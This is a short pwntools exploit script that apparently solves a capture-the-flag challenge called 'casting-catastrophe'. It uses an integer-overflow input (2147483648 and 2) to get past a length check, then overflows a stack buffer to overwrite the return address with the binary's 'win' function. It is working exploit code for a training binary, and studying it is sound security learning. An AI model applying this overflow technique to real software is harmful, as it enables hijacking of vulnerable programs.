from pwn import *

'''
get to unsigned int with scanf("%u"), but:
imul eax, edx
cmp eax, 0x1b                   # make sure eax <= 0x1b

in read construct:
mov rax, eax
mov rdx, edx
imul rax, rdx

In [10]: hex(2147483648 * 2)
Out[10]: '0x100000000'

that satisfied condition
NOTE: here two -1 will cause nbytes exceed 2^63 - 1
'''

context.binary = elf = ELF('/challenge/casting-catastrophe', checksec=False)

win_addr = elf.symbols['win']

print(f'[+] win addr: {hex(win_addr)}')

io = elf.process()

io.sendline(b'2147483648')
io.sendline(b'2')

io.sendline(b'A' * 0x38 + p64(win_addr))

io.interactive()
